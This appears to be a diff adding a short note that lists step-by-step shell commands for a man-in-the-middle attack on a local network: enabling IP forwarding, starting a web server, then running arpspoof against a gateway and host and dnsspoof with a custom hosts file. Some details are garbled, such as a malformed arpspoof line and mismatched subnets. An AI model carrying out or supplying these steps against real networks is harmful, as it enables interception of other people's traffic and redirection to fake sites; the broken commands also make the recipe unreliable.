@@ -1,0 +1,9 @@
+I want to write the following steps by steps.
+
+1. apt-get install bridge-utils
+2. echo 1  > /proc/sys/net/ipv4/ip_forward
+3. clear
+4. apache2ctl start 
+5. clear
+6. arpspoof -t 192.168.1.1 192.168.1.5 && 192.168.1.1
+7. dnsspoof -f Desktop/spoofhosts.txt host 192.168.0.17 and udp port 53
